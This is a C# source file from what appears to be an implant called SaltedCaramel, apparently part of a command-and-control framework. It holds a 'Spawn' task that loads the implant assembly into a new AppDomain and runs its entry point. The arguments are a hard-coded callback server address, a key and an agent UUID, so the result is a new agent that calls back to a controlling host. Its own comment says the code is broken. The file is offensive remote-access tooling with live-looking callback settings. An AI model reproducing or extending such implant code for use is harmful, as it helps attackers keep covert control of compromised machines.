using System;
using System.Reflection;
using SaltedCaramel.Jobs;

namespace SaltedCaramel.Tasks
{
    class Spawn
    {
        /// <summary>
        /// Spawn a new SaltedCaramel agent. Note: This is currently
        /// BROKEN and should be implemented via the GetFile and
        /// assembly.LoadBytes. Alternatively, you could null out the
        /// callbackId and retry. It might still work actually.
        /// I don't know.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        public static void Execute(Job job, SCImplant agent)
        {
            //typeof(SaltedCaramel).Assembly.EntryPoint.Invoke(null, 
            //    new[] { new string[] { "https://192.168.38.192", "CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=", "3915d66f-e9a5-4912-8442-910e0cee74df" } });
            AppDomain domain = AppDomain.CreateDomain("asdfasdf");
            Assembly target = domain.Load(typeof(SaltedCaramel).Assembly.FullName);
            string[] args = { "https://192.168.38.192", "CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=", "3915d66f-e9a5-4912-8442-910e0cee74df" };
            target.EntryPoint.Invoke(null, new[] { args });
        }
    }
}
